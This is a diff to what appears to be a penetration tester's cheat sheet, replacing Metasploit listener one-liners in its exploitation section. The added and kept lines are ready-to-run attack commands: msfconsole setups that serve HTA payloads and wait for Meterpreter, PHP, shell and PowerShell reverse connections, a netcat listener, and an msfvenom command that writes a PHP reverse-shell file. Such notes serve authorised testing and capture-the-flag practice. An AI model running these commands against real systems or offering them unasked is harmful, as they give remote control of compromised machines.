@@ -95,10 +95,12 @@ Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
 
 # Exploitation
 ## Listeners
-rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; run"
-rlwrap msfconsole -q -x "use multi/handler; set payload windows/powershell_reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
-rlwrap msfconsole -q -x "use multi/handler; set payload windows/shell_reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
 rlwrap nc -lvnp 5555
+rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; set TARGET 1; set payload windows/x64/meterpreter/reverse_tcp; run"
+rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; set TARGET 0; set payload windows/meterpreter/reverse_tcp; run"
+rlwrap msfconsole -q -x "use multi/handler; set payload php/reverse_php; set LHOST $MYIP; set LPORT 5555; run"
+rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
+rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/powershell_reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
 
 ## MSFVenom
 msfvenom -p php/reverse_php LHOST=$MYIP LPORT=5555 -f raw -o shell.php
